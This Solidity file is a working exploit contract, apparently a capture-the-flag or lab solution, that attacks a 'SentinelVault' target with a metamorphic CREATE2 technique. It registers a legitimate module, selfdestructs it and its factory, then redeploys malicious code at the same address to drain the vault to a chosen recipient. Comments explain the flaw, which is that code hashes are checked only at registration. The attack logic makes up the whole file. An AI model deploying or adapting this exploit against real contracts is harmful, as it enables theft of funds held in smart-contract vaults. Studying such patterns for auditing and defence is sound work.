// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "../targets/setinel/EchoModule.sol";
import "../targets/setinel/interfaces/ISentinelVault.sol";
import "./echoModuleFactory.sol";
import "./EchoModule_attack.sol";

/// @notice Orchestrates the metamorphic CREATE2 attack on SentinelVault.
///
/// Attack overview:
///   The vault checks extcodehash at registration time but NOT at withdrawal time.
///   We exploit this by registering a legit EchoModule, selfdestructing it,
///   then redeploying malicious code at the same address. The vault still sees
///   the address as a registered module, so operatorWithdraw succeeds.
///
/// Flow (2 transactions):
///   phase1(): Deploy Factory via CREATE2 → Factory deploys EchoModule via CREATE
///             → register module with vault → selfdestruct module → selfdestruct factory
///             (all in 1 tx, so EIP-6780 allows selfdestruct to clear code)
///
///   phase2(): Redeploy Factory at SAME CREATE2 address (same salt + same bytecode)
///             → Factory nonce reset to 0, so CREATE child lands at SAME address
///             → but this time it's EchoModuleAttack → drain the vault
///
/// Was (original): tried to do everything in one function, used nonexistent deploy()/opcode()
/// functions, raw address calls without interface casts, wrong CREATE2 usage.
contract SentinelAttack {
    // Phase flag — Factory reads this to decide what to deploy
    // false = legit EchoModule, true = malicious EchoModuleAttack
    bool public attackPhase;

    // Fixed salt for CREATE2 — must be identical both times
    bytes32 public constant SALT = keccak256("sentinel");

    /// @notice Phase 1: Deploy legit module, register it, then destroy everything.
    ///         Everything happens in ONE transaction so selfdestruct clears code (EIP-6780).
    function phase1(ISentinelVault _vault) external {
        attackPhase = false;

        // Deploy Factory via CREATE2 — deterministic address
        Factory factory = new Factory{salt: SALT}();

        // Factory deploys legit EchoModule via CREATE (nonce=1)
        // Was: raw address calls, no return value handling
        address module = factory.deploy();

        // Register with vault — code hash matches the approved hash
        // Was: target.registerModule(module) — raw address, needs ISentinelVault cast
        _vault.registerModule(module);

        // Selfdestruct the EchoModule — clears code at that address
        // Was: module.decommission() — raw address, needs EchoModule cast
        EchoModule(module).decommission();

        // Selfdestruct the Factory — resets nonce so next CREATE child gets same address
        // Was: factory.distruct() — typo
        factory.destroy();

        // End of transaction: both Factory and EchoModule code are cleared
    }

    /// @notice Phase 2: Redeploy factory + malicious module at the SAME addresses, drain vault.
    ///         Must be called in a SEPARATE transaction (after phase1's selfdestruct took effect).
    function phase2(ISentinelVault _vault, address _recipient) external {
        attackPhase = true;

        // Redeploy Factory via CREATE2 — SAME address as phase1 (same deployer + salt + bytecode)
        Factory factory = new Factory{salt: SALT}();

        // Factory deploys EchoModuleAttack via CREATE — SAME address as the old EchoModule
        // (factory address is the same, nonce is 1 again)
        address atk = factory.deploy();

        // The vault still has this address registered as a valid module
        // (it checked extcodehash at registration, but the code is now different)
        // Was: raw address calls, nonexistent balanceOf(), missing ()
        EchoModuleAttack(atk).attack(address(_vault), _recipient);
    }

    // Accept ETH (in case needed)
    receive() external payable {}
}
